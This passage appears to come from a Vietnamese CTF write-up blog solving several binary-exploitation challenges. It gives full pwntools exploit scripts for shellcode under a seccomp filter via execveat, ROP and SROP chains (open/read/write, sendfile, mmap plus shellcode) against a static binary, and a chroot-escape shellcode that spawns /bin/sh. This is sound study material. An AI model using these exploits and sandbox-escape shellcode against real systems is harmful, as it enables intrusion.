//mmap
mov rax,9
mov rsi,0x100
mov rdi,0
mov rdx,1
mov r10,2
mov r8,0x3e9
mov r9,0
syscall

//writev
mov rsi,rax // rax chứa buffer trả về 
mov r9,0x100  // iov_len
push r9
push rsi
mov rdx,1 // 1 struct
mov rdi,0x3e9 // fd
mov rsi,rsp
mov rax,0x20 //syscall number
```


exp : 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./syscalls")

context.binary = exe

p = process()
gdb.attach(p,gdbscript='''
           brva 0x00000000000012D6
           ''')

sc = asm('''
        mov rax,0x21
        mov rdi,1
        mov rsi,0x3e9
        syscall

        mov rax,0x101
        mov rdx,29816
        push rdx
        movabs rsi,8371742425456455470
        push rsi
        xor rdx,rdx
        xor rsi,rsi
        mov rdi,-100
        mov rsi,rsp
        syscall

        mov r8,rax
        mov rax,9
        mov rsi,0x100
        mov rdi,0
        mov rdx,1
        mov r10,2
        mov r9,0
        syscall

        mov r10,rax
        mov r9,0x100
        push r9
        push r10
        mov rdx,1
        mov rdi,0x3e9
        mov rsi,rsp
        mov rax,0x14
        syscall
         ''')
input()
p.sendline(sc)
p.interactive()
```

lụm =)) 
![lum=))](/assets/images/lum.png)

ref : ![ref](https://ctftime.org/writeup/39292)

## lemonshell


file [here](/assets/files/lemonshell.rar)

### overview

- đầu tiên là sử dụng ```mmap``` tạo 1 vùng nhớ mới với full quyền , tiếp theo mỗi lần ta sẽ được nhập 8 byte để thực thi shellcode 

```cs
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int v3; // eax
  void (*v4)(const char *, ...); // rax
  void (*v5)(const char *, ...); // [rsp+18h] [rbp-18h]
  void (*v6)(const char *, ...); // [rsp+20h] [rbp-10h]

  v3 = getpagesize();
  v6 = (void (*)(const char *, ...))mmap(0LL, -v3 & 0x4000, 7, 34, -1, 0LL);
  if ( !v6 )
    __assert_fail("psc != NULL", "src/lemon.c", 0x6Bu, "main");
  fflush(stdout);
  while ( 1 )
  {
    v5 = v6;
    do
    {
      v4 = v5;
      v5 = (void (*)(const char *, ...))((char *)v5 + 8);
    }
    while ( (unsigned int)__isoc99_scanf("%lf", v4) );
    v6("%lf");
  }
}
```
- hàm này có vẻ là setup cho ```seccomp```

```cs
unsigned __int64 sub_400890()
{
  int i; // [rsp+8h] [rbp-58h]
  __int16 v2; // [rsp+10h] [rbp-50h] BYREF
  __int16 *v3; // [rsp+18h] [rbp-48h]
  __int16 v4; // [rsp+20h] [rbp-40h] BYREF
  char v5; // [rsp+22h] [rbp-3Eh]
  char v6; // [rsp+23h] [rbp-3Dh]
  int v7; // [rsp+24h] [rbp-3Ch]
  __int16 v8; // [rsp+28h] [rbp-38h]
  char v9; // [rsp+2Ah] [rbp-36h]
  char v10; // [rsp+2Bh] [rbp-35h]
  int v11; // [rsp+2Ch] [rbp-34h]
  __int16 v12; // [rsp+30h] [rbp-30h]
  char v13; // [rsp+32h] [rbp-2Eh]
  char v14; // [rsp+33h] [rbp-2Dh]
  int v15; // [rsp+34h] [rbp-2Ch]
  __int16 v16; // [rsp+38h] [rbp-28h]
  char v17; // [rsp+3Ah] [rbp-26h]
  char v18; // [rsp+3Bh] [rbp-25h]
  int v19; // [rsp+3Ch] [rbp-24h]
  __int16 v20; // [rsp+40h] [rbp-20h]
  char v21; // [rsp+42h] [rbp-1Eh]
  char v22; // [rsp+43h] [rbp-1Dh]
  int v23; // [rsp+44h] [rbp-1Ch]
  __int16 v24; // [rsp+48h] [rbp-18h]
  char v25; // [rsp+4Ah] [rbp-16h]
  char v26; // [rsp+4Bh] [rbp-15h]
  int v27; // [rsp+4Ch] [rbp-14h]
  unsigned __int64 v28; // [rsp+58h] [rbp-8h]

  v28 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  if ( prctl(38, 1LL, 0LL, 0LL, 0LL) )
    __assert_fail("prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == 0", "src/lemon.c", 0x43u, "setup");
  v4 = 32;
  v5 = 0;
  v6 = 0;
  v7 = 4;
  v8 = 21;
  v9 = 0;
  v10 = 3;
  v11 = -1073741762;
  v12 = 32;
  v13 = 0;
  v14 = 0;
  v15 = 0;
  for ( i = 0; !i; i = 1 )
  {
    v16 = 21;
    v17 = 1;
    v18 = 0;
    v19 = qword_601078;
  }
  v20 = 6;
  v21 = 0;
  v22 = 0;
  v23 = 2147418112;
  v24 = 6;
  v25 = 0;
  v26 = 0;
  v27 = 332340;
  v2 = 6;
  v3 = &v4;
  if ( prctl(22, 2LL, &v2, 0LL, 0LL) )
    __assert_fail("prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &fprog, 0, 0) == 0", "src/lemon.c", 0x61u, "setup");
  return __readfsqword(0x28u) ^ v28;
}
```

- ở đây nó chỉ cấm mỗi ```execve``` thôi , vậy còn rất nhiều các syscall có thể hữu ích như ```orw```  hoặc openat , openat2 ....

```cs
ploi@PhuocLoiiiii:~/pwn/shellcode/byte$ seccomp-tools dump ./lemonshell.bin
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0005
 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0005: 0x06 0x00 0x00 0x00051234  return ERRNO(4660)
```

- tuy nhiên ở bài này mình sẽ sử dụng ```execveat``` 

ở đây giá trị của ```dirfd``` được bỏ qua khi ```pathname``` là 1 đường dẫn tuyệt đối , nếu path là tương đối thì ```dirfd``` giá trị là ```AT_FDCWD``` , flag và envp sẽ là NULL , 

```cs
 int execveat(int dirfd, const char *pathname,
                    char *const _Nullable argv[],
                    char *const _Nullable envp[],
                    int flags);
```

- argv là 1 mảng chứa các tham số 


```cs
char *argv[] = { "ls", NULL };
execveat(AT_FDCWD, "/bin/ls", argv, NULL, 0);
```

tương đương với

```cs
/bin/ls
```

- ở bài này trước hết mình sẽ dùng 1 /bin/ls để biết tên file flag

```cs
   push 0x42
    pop rax
    inc ah
    cqo

    push rdx
    movabs rdi, 0x2f
    push rdi
    push rsp
    pop r12

    push rdx
    movabs rdi, 0x736c2f2f6e69622f
    push rdi
    push rsp
    pop rsi

    push rdx
    push r12
    push rsi
    push rsp
    pop rdx

    xor rdi, rdi
    mov r10, rdi
    mov r8, rdi
    syscall
```

- tiếp theo sẽ là đọc flag

```cs
 push 0x42
    pop rax
    inc ah
    cqo

    push rdx
    movabs rdi, 0x67616c662f
    push rdi
    push rsp
    pop r12

    push rdx
    movabs rdi, 0x7461632f6e69622f
    push rdi
    push rsp
    pop rsi

    push rdx
    push r12
    push rsi
    push rsp
    pop rdx

    xor rdi, rdi
    mov r10, rdi
    mov r8, rdi
    syscall
```

- ta cũng cần chú ý là mỗi lần ta chỉ được input 8 byte và nó sẽ đọc giá trị float , vậy ta có thể sử dụng : 

```cs
payload = str(struct.unpack('d', p64(addr))[0]).encode()
###################################################################################
payload = str(struct.unpack('d', b'\xff\xff\xff\xff\xff\xff\xff\xff')[0]).encode()
```

exp 

```cs
#!/usr/bin/python3

from pwn import *

context.binary = exe =  ELF('./lemonshell.bin')
context.arch = 'amd64'
from struct import unpack
p = process()
shellcode = asm(
    """
    push 0x42
    pop rax
    inc ah
    cqo

    push rdx
    movabs rdi, 0x2f
    push rdi
    push rsp
    pop r12

    push rdx
    movabs rdi, 0x736c2f2f6e69622f
    push rdi
    push rsp
    pop rsi

    push rdx
    push r12
    push rsi
    push rsp
    pop rdx

    xor rdi, rdi
    mov r10, rdi
    mov r8, rdi
    syscall
    """,
    endian='little',
    arch="amd64",
    bits=64
)
shellcode += b"\x90" * (8 - (len(shellcode) % 8))

print(disasm(shellcode, arch="amd64"))

for i in range(0, len(shellcode), 8):
    data = shellcode[i:i + 8]
    double = unpack('<d', data)[0]
    input()
    p.sendline(repr(double))

p.sendline(b"a")
p.interactive()
```

- ngoài ra mình cũng tìm thấy 1 shellcode thực thi /bin//sh tuy nhiên bằng 1 cách nào đó nó không hoạt động [here](https://shell-storm.org/shellcode/files/shellcode-905.html)



## one-and-done

- checksec : 

```cs
[*] '/home/ploi/pwn/ROP/tamu_ctf/one-and-done'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- file : 

```cs
ploi@PhuocLoiiiii:~/pwn/ROP/tamu_ctf$ file one-and-done
one-and-done: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped
```

- nhìn qua thì thấy đây là 1 bài rop bình thường và có cả puts , tuy nhiên thì file này là 1 file static nên ta không thể leak libc và lấy shell như bình thườnng được

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[128]; // [rsp+0h] [rbp-120h] BYREF
  sigaction sa; // [rsp+80h] [rbp-A0h] BYREF

  memset(&sa, 0LL, sizeof(sa));
  sa.sa_handler = (void (*)(int))handler;
  sa.sa_flags = 4;
  sigaction_0(11, &sa, 0LL);
  puts("pwn me pls");
  gets(s);
  return 0;
}
```

### cách 1 : open + read + write
- đầu tiên đơn giản là read chuỗi path vào bss , tiếp theo là open read writewrite

```cs
def read(writable,fd =3 ,count = 0x100):
    pl = p64(pop_rax) + p64(0)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret) + p64(exe.sym.main)
    return pl

def read_flag(writable,fd =3 ,count = 0x100):
    pl = p64(pop_rax) + p64(0)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret)
    return pl

#       const char *filename, int flags, umode_t mode
def open(filename,flags=0,mode=0):
    pl = p64(pop_rax) + p64(2)
    pl += p64(pop_rdi) + p64(filename)
    pl += p64(pop_rsi) + p64(flags)
    pl += p64(pop_rdx) + p64(mode)
    pl += p64(syscall_ret)
    return pl
# unsigned int fd, const char *buf, size_t count
def write(writable,fd=1,count=0x100):
    pl = p64(pop_rax) + p64(fd)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret)
    return pl
```

exp (orw) : 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./one-and-done',checksec=False)

p = process()

offset = 0x120
pop_rdi = 0x0000000000401793
pop_rsi = 0x0000000000401713
pop_rdx = 0x0000000000401f31
syscall_ret = 0x0000000000401ab2
pop_rax = 0x000000000040100b
bss = 0x405ea0
gets_addr = 0x0000000000401230


#       unsigned int fd, char *buf, size_t count
def read(writable,fd =3 ,count = 0x100):
    pl = p64(pop_rax) + p64(0)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret) + p64(exe.sym.main)
    return pl

def read_flag(writable,fd =3 ,count = 0x100):
    pl = p64(pop_rax) + p64(0)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret)
    return pl

#       const char *filename, int flags, umode_t mode
def open(filename,flags=0,mode=0):
    pl = p64(pop_rax) + p64(2)
    pl += p64(pop_rdi) + p64(filename)
    pl += p64(pop_rsi) + p64(flags)
    pl += p64(pop_rdx) + p64(mode)
    pl += p64(syscall_ret)
    return pl
# unsigned int fd, const char *buf, size_t count
def write(writable,fd=1,count=0x100):
    pl = p64(pop_rax) + p64(fd)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret)
    return pl


def state1():
    payload = b'a'*0x128
    payload += read(bss,0)
    return payload

def state2():
    payload = b'a'*0x128
    payload += open(bss)
    payload += read_flag(bss+0x50)
    payload += write(bss+0x50)
    return payload

input()
payload2 = state1()
p.sendlineafter(b'pwn me pls',payload2)
input()
p.send(b'./flag.txt\x00')

payload3 = state2()
p.sendlineafter(b'pwn me pls',payload3)




p.interactive()
```

### cách 2 (open + sendfile)

- trước tiên cần biết cách setup syscall ```sendfile``` , ở đây 

1. in_fd sẽ là read và out_fd sẽ là write
2.  Nếu offset là NULL, thì dữ liệu sẽ được đọc từ in_fd , thằng này sẽ là NULLNULL
3.  count là số byte cần sao chép giữa các mô tả tệp , có nghĩa là từ read sang write (số byte được in ra)

vậy out_fd sẽ là 1 và in_fd là 3
```cs
#include <sys/sendfile.h>

       ssize_t sendfile(int out_fd, int in_fd, off_t *_Nullable offset,
                        size_t count);
```

- ở đây tham số thứ 4 là r10 , tuy nhiên ta không có gadget nào control nó :

```cs
ploi@PhuocLoiiiii:~/pwn/ROP/tamu_ctf$ ropper -f one-and-done | grep r10
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0000000000401e42: add eax, 0xdaf88348; jne 0x1e0d; xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x0000000000401d8a: add eax, 0xfa8948c3; mov r10d, 8; lea rsi, [rip + 0x129c]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401ad4: add edi, eax; cmp byte ptr [r10], al; add byte ptr [rax], al; add byte ptr [rax + 0xda], bh; lea rdi, [rip + 0x4328]; syscall;
0x0000000000401ad6: cmp byte ptr [r10], al; add byte ptr [rax], al; add byte ptr [rax + 0xda], bh; lea rdi, [rip + 0x4328]; syscall;

0x000000000040226b: cmp byte ptr [r8 + 0x39], r9b; sub byte ptr [r10 + rcx + 0x31], r14b; sal byte ptr [rcx], cl; test byte ptr [rax - 0x77], -0x11; call qword ptr [rbp + 0x48];
0x000000000040226c: cmp byte ptr [rax + 0x39], cl; sub byte ptr [r10 + rcx + 0x31], r14b; sal byte ptr [rcx], cl; test byte ptr [rax - 0x77], -0x11; call qword ptr [rbp + 0x48];
0x0000000000401e44: cmp eax, -0x26; jne 0x1e0d; xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x0000000000401e43: cmp rax, -0x26; jne 0x1e0d; xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x0000000000401e46: fidiv dword ptr [rbp - 0x3c]; xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x0000000000401e33: jae 0x1e55; movsxd rdx, edx; xor r10d, r10d; mov rax, rbx; mov rsi, rbp; syscall;
0x0000000000401e47: jne 0x1e0d; xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x0000000000401a3f: jns 0x1a63; movsxd rdx, r8d; xor r10d, r10d; mov rax, r9; mov rsi, rbx; syscall;
0x0000000000401d8d: mov edx, edi; mov r10d, 8; lea rsi, [rip + 0x129c]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401d73: mov edx, edi; mov r10d, 8; lea rsi, [rip + 0x12be]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401579: mov esi, esp; movsxd rdi, r12d; mov r10d, 8; mov eax, 0xd; syscall;
0x0000000000401d8f: mov r10d, 8; lea rsi, [rip + 0x129c]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401d75: mov r10d, 8; lea rsi, [rip + 0x12be]; xor edi, edi; mov eax, 0xe; syscall;
0x000000000040157e: mov r10d, 8; mov eax, 0xd; syscall;
0x0000000000401da9: mov r10d, 8; mov eax, 0xe; xor edx, edx; mov edi, 2; syscall;
0x000000000040210d: mov rdx, r10; mov rsi, r9; mov rdi, r8; call 0x1fee; add rsp, 0x18; ret;
0x0000000000401d8c: mov rdx, rdi; mov r10d, 8; lea rsi, [rip + 0x129c]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401d72: mov rdx, rdi; mov r10d, 8; lea rsi, [rip + 0x12be]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401578: mov rsi, rsp; movsxd rdi, r12d; mov r10d, 8; mov eax, 0xd; syscall;
0x000000000040157b: movsxd rdi, r12d; mov r10d, 8; mov eax, 0xd; syscall;
0x0000000000401e35: movsxd rdx, edx; xor r10d, r10d; mov rax, rbx; mov rsi, rbp; syscall;
0x0000000000401a41: movsxd rdx, r8d; xor r10d, r10d; mov rax, r9; mov rsi, rbx; syscall;
0x000000000040226f: sub byte ptr [r10 + rcx + 0x31], r14b; sal byte ptr [rcx], cl; test byte ptr [rax - 0x77], -0x11; call qword ptr [rbp + 0x48];
0x0000000000401576: xor edx, edx; mov rsi, rsp; movsxd rdi, r12d; mov r10d, 8; mov eax, 0xd; syscall;
0x0000000000401a44: xor r10d, r10d; mov rax, r9; mov rsi, rbx; syscall;
0x0000000000401e38: xor r10d, r10d; mov rax, rbx; mov rsi, rbp; syscall;
0x0000000000401e49: xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x0000000000401e45: clc; fidiv dword ptr [rbp - 0x3c]; xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x000000000040157d: cld; mov r10d, 8; mov eax, 0xd; syscall;
0x0000000000401d8e: cli; mov r10d, 8; lea rsi, [rip + 0x129c]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401d74: cli; mov r10d, 8; lea rsi, [rip + 0x12be]; xor edi, edi; mov eax, 0xe; syscall;
```

- vì vậy ta sẽ dùng ```SROP``` để có thể control được ```r10``` : 

script : 

```cs
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./one-and-done',checksec=False)

p = process()

offset = 0x120
pop_rdi = 0x0000000000401793
pop_rsi = 0x0000000000401713
pop_rdx = 0x0000000000401f31
syscall_ret = 0x0000000000401ab2
pop_rax = 0x000000000040100b
bss = 0x405ea0
gets_addr = 0x0000000000401230


#       unsigned int fd, char *buf, size_t count
def read(writable,fd =3 ,count = 0x100):
    pl = p64(pop_rax) + p64(0)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret) + p64(exe.sym.main)
    return pl

def read_flag(writable,fd =3 ,count = 0x100):
    pl = p64(pop_rax) + p64(0)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret)
    return pl

#       const char *filename, int flags, umode_t mode
def open(filename,flags=0,mode=0):
    pl = p64(pop_rax) + p64(2)
    pl += p64(pop_rdi) + p64(filename)
    pl += p64(pop_rsi) + p64(flags)
    pl += p64(pop_rdx) + p64(mode)
    pl += p64(syscall_ret)
    return pl
# unsigned int fd, const char *buf, size_t count
def write(writable,fd=1,count=0x100):
    pl = p64(pop_rax) + p64(fd)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret)
    return pl

def sendfile():
    '''call sendfile(rdi=0x1, rsi=0x3, rdx=0x0, r10=0x7fffffff)'''
    pl = p64(pop_rax) + p64(0xf)
    pl += p64(syscall_ret)
    frame = SigreturnFrame(arch = "amd64", kernel="amd64")
    frame.rax = constants.SYS_sendfile
    frame.rsi = 3
    frame.rdi = 1
    frame.rdx = 0
    frame.r10 = 0x50
    frame.rip = syscall_ret
    pl += bytes(frame)
    return pl


def state1():
    payload = b'a'*0x128
    payload += read(bss,0)
    return payload

def state2():
    payload = b'a'*0x128
    payload += open(bss)
    payload += sendfile()
    return payload

input()
payload2 = state1()
p.sendlineafter(b'pwn me pls',payload2)
input()
p.send(b'./flag.txt\x00')

payload3 = state2()
p.sendlineafter(b'pwn me pls',payload3)




p.interactive()
```

![flag](/assets/images/flagshellcode1.png)


### cách 3 : srop + mmap + shellcode 

- vì rảnh và lâu rồi không làm srop nên mình mất tầm 2 tiếng để giải quyết theo cách này =)))  , mình đã cố gắng không sử dụng các **gadget** và chỉ sử dụng mỗi **srop**

- trước hết vì ta không thể control được địa chỉ nào để khi **srop** nó sẽ quay về **main** 1 lần nữa , mình sẽ ghi **main** vào **bss** trước , ở đây ta cần tránh ghi đè vào các dữ liệu khác 

```python
def read_main():
    payload = p64(pop_rax) + p64(0xf)
    payload += p64(syscall_ret)
    frame = SigreturnFrame(arch="amd64",kernel="amd64")
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = bss
    frame.rdx = 16
    frame.rsp = bss
    frame.rip = syscall_ret
    payload += bytes(frame)
    return payload
```

- rsp ở đây sẽ là con trỏ chứa địa chỉ main -> nó sẽ return về main , tiếp theo stack lúc này sẽ là **bss** và vì **PIE** tắt nên ta hoàn toàn có thể debug và biết được tiếp theo nó sẽ return về đâu 

- ở lần sử dụng **Sigreturn** tiếp theo mình sẽ setup **mmap** 1 địa chỉ với full quyền (rwx) , và rsp sẽ chuỗi rop giúp ta có thêm 1 lần **srop** nữa , lần **srop** kế tiếp sẽ là dùng **gets** , tại sao mình lại sử dụng **gets** ? vì khi đó sau khi **gets** xong thì dữ liệu sẽ được đặt ở **rax** , ta sẽ kết hợp với **call_rax** để thực thi shellcode ^^

đây là setup cho **mmap**

```python
def mmap():
    payload = p64(pop_rax) + p64(0xf)
    payload += p64(syscall_ret)

    frame = SigreturnFrame(arch = "amd64", kernel="amd64")
    frame.rax = 0x9
    frame.rdi = 0x200000
    frame.rsi = 0x100000
    frame.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
    frame.r10 = constants.MAP_ANONYMOUS | constants.MAP_PRIVATE | constants.MAP_FIXED
    frame.r8 = -1
    frame.rip = syscall_ret
    frame.rsp = 0x404898

    payload += bytes(frame)
    return payload
```

exp: 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./one-and-done',checksec=False)

p = process()

offset = 0x120
pop_rdi = 0x0000000000401793
pop_rsi = 0x0000000000401713
pop_rdx = 0x0000000000401f31
syscall_ret = 0x0000000000401ab2
pop_rax = 0x000000000040100b
bss = 0x404780
gets_addr = 0x0000000000401230
offset = 0x128
call_rax = 0x0000000000402390
gets = 0x401795
#mmap(0x0, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED)
def read_main():
    payload = p64(pop_rax) + p64(0xf)
    payload += p64(syscall_ret)
    frame = SigreturnFrame(arch="amd64",kernel="amd64")
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = bss
    frame.rdx = 16
    frame.rsp = bss
    frame.rip = syscall_ret
    payload += bytes(frame)
    return payload

def read_shellcode():
    payload = p64(pop_rax) + p64(0xf)
    payload += p64(syscall_ret)
    frame = SigreturnFrame(arch="amd64",kernel="amd64")
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = 0x200000
    frame.rdx = 0x300
    frame.rsp = bss
    frame.rip = syscall_ret
    payload += bytes(frame)
    payload += p64(call_rax)
    return payload

def mmap():
    payload = p64(pop_rax) + p64(0xf)
    payload += p64(syscall_ret)

    frame = SigreturnFrame(arch = "amd64", kernel="amd64")
    frame.rax = 0x9
    frame.rdi = 0x200000
    frame.rsi = 0x100000
    frame.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
    frame.r10 = constants.MAP_ANONYMOUS | constants.MAP_PRIVATE | constants.MAP_FIXED
    frame.r8 = -1
    frame.rip = syscall_ret
    frame.rsp = 0x404898

    payload += bytes(frame)
    return payload

payload = b'a'*offset
payload += read_main()
input("stage1")
p.sendlineafter(b'pwn me pls',payload)
input()
p.sendline(p64(exe.sym.main))

input("stage2")
payload3 = b'a'*offset
payload3 += mmap()
payload3 += p64(pop_rax)
payload3 += p64(0xf)
payload3 += p64(syscall_ret)

frame = SigreturnFrame(arch="amd64",kernel="amd64")
frame.rdi = 0x200000
frame.rip = gets
frame.rsp = 0x4049a8
payload3 += bytes(frame)
payload3 += p64(call_rax)



p.sendline(payload3)
shellcode = asm('''
                xor rax,rax
                xor rdi,rdi
                xor rsi,rsi
                xor rdx,rdx
                movabs rdi,29400045130965551
                push rdi
                mov rdi,rsp
                mov al,0x3b
                syscall
                ''')
input()
p.sendline(shellcode)





p.interactive()
```

- chú ý rằng các địa chỉ được setup ở frame.rsp là do debug mà mình có được 

![shell](/assets/images/shellhehe.png)

- 1 cách khác nữa là sử dụng gadget này : ```0x000000000040213a: mov dword ptr [rdi], eax; or eax, 0xffffffff; ret;``` , mình lười quá nên để ở đây , ta cần setup **rax** sẽ là chuỗi flag và rdi là nơi ta muốn đặt nó vào , chú ý ở đây chỉ được đặt 4 bytes nên nếu path dài thì phải đặt nhiều lần
- 1 cách khác nữa là dùng ```mprotect``` như **mmap** ta có thể leak **libc_stack_end** để lấy địa chỉ stack và read shellcode vào stack , nói chung vẫn là dùng shellcode để lấy shell 

## Cube

- 1 bài ở dreamhack  

- main: ta thấy nó sẽ `mmap` 1 vùng nhớ với quyền `rwx` tiếp theo là nhập shellcode vào và thực thi nó , ngoài ra còn 1 hàm sandbox ta sẽ cùng xem xét nó 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+0h] [rbp-10h]

  buf = mmap(0LL, 0x400uLL, 7, 34, -1, 0LL);
  init();
  sandbox();
  printf("Give me shellcode: ");
  read(0, buf, 0x50uLL);
  ((void (*)(void))buf)();
  return 0;
}
```


- sandbox: ở đây nó sử dụng `chroot` , ta sẽ cùng tìm hiểu nó là gì

chroot là 1 hàm trong C dùng để giới hạn quyền truy cập của chương trìnhh vào 1 phần nhất định của hệ thống file , Nói cách khác, nó tạo ra một (sandbox), nơi mà chương trình chỉ có thể nhìn thấy và truy cập các tập tin bên trong thư mục được chỉ định.

- và đoạn code bên dưới , nếu thực thi thành công thì Thư mục /home/cube/cube_box sẽ được coi như là thư mục gốc / của chương trình và không thể truy cập ra ngoài được nữa 

```c 
int sandbox()
{
  return chroot("/home/cube/cube_box");
}
```

- đầu tiên mình thử gửi shellcode execve('/bin/sh',0,0) và chắc chắn nó sẽ không hoạt động vì hệ thống file bị giới hạn , Chương trình chỉ còn "thấy" những file bên trong /home/cube/cube_box. Tất cả những gì nằm bên ngoài, như /bin/sh, /lib, /etc/passwd... thì bị ẩn hoàn toàn.
- vì vậy mình đã tìm kiếm 1 giải pháp cho vấn đề này [here](https://blog.pentesteracademy.com/privilege-escalation-breaking-out-of-chroot-jail-927a08df5c28) , ta thấy anh ấy dùng `chdir` để đổi path hiện tại khá nhiều lần cho đến `root` , xong thiết lập `chroot` với đường dẫn hiện tại là `root` , lúc này chỉ cần thực thi execve là sẽ có thể lấy được shell

- vậy tóm lại ta chỉ cần dùng `chdir` đến path của `root` và `chroot('.')` và thực thi `execve`

exp: 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./cube',checksec=False)

#p = process()
p = remote('host3.dreamhack.games', 19615)



shellcode = shellcraft.chdir("../../../..")
shellcode += shellcraft.chroot(".")
shellcode += shellcraft.execve("/bin/sh", 0, 0)
shellcode = asm(shellcode)
p.sendafter(b'shellcode: ',shellcode)

p.interactive()
```

